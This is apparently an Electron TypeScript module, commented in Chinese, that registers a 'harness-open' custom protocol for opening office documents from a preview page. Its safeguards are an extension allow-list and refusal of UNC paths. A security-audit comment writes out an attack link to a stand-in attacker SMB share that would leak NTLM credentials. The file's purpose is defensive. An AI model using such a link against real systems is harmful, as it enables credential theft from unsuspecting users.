/**
 * `harness-open` 自定义协议（11-24）。
 *
 * 为什么需要它：PPT 实时预览页是 `file://` 页面（右栏浏览器里的本地 HTML），
 * 里面调不到 IPC —— 用户点「用其他应用打开」时没有任何通道能触达主进程。
 * 自定义协议是唯一不引入 preload 的办法。
 *
 * ⛔⛔ 安全闸只有一个：**扩展名白名单**。`shell.openPath` 对 `.exe` / `.bat` / `.ps1`
 *    等同于「直接执行」，如果任意页面都能让系统打开任意文件，就等于给网页一个
 *    本地代码执行入口。所以这里只放行办公文档，其余一律 415。
 * ⛔ 不做路径存在性/可信根校验：与项目 10-29 的既定立场一致（预览/打开不判可信根），
 *    真正的闸门是「这类文件双击也只是被办公软件打开」。
 * ⛔⛔ 必须**同时**注册到内置浏览器分区（11-24 实测）：`protocol.handle` 只作用于默认 session，
 *    而右栏浏览器 webview 跑在 `persist:harness-browser` 分区。只注册默认 session 的话，
 *    预览页里点这个链接会导航到「未注册协议」⇒ 页面直接变成「打不开这个网页」错误页。
 */
import { protocol, session, shell } from "electron";
import { BROWSER_PARTITION } from "./browser-partition";

/** 允许交给系统默认应用打开的文件类型（办公文档；⛔ 绝不加入可执行/脚本类）。 */
const OPENABLE = /\.(pptx?|pptm|potx|ppsx?|key|odp|xlsx?|xlsm|xlsb|csv|ods|docx?|docm|odt|rtf|pdf)$/i;

/** 与 `protocol.handle` 的 handler 同型（⛔ 别手写一份会漂移的签名）。 */
type ProtocolHandler = Parameters<typeof protocol.handle>[1];

/**
 * 注册协议：`harness-open://open?path=<绝对路径>` → 用系统默认程序打开。
 * 返回 200 = 已交给系统；415 = 类型不在白名单；500 = 系统没有关联程序（body 是原因文案）。
 */
export function registerHarnessOpenProtocol(): void {
  const handler: ProtocolHandler = async (request) => {
    const target = new URL(request.url).searchParams.get("path") ?? "";
    if (!target) return new Response("Missing path", { status: 400 });
    /* ⛔⛔ 11-28 安全审计 F-06：这个协议同时注册进 BROWSER_PARTITION（远程网页所在分区），
       且不校验来源 ⇒ 任意站点可以 `harness-open://open?path=\\attacker\share\x.pdf` 让资源管理器
       去连 SMB、把 NTLM 凭据发给攻击者。⇒ UNC 路径一律拒绝（本机绝对路径不会以 \\ 开头）。 */
    if (/^[\\/]{2}/.test(target)) return new Response("UNC path refused", { status: 403 });
    if (!OPENABLE.test(target)) return new Response("Unsupported file type", { status: 415 });
    try {
      const failure = await shell.openPath(target);
      return new Response(failure || "ok", { status: failure ? 500 : 200 });
    } catch (error) {
      return new Response(String(error), { status: 500 });
    }
  };
  protocol.handle("harness-open", handler);
  /* ⛔ 内置浏览器分区单独注册一份（同一个 handler，两套 session 各存各的注册表）。 */
  session.fromPartition(BROWSER_PARTITION).protocol.handle("harness-open", handler);
}
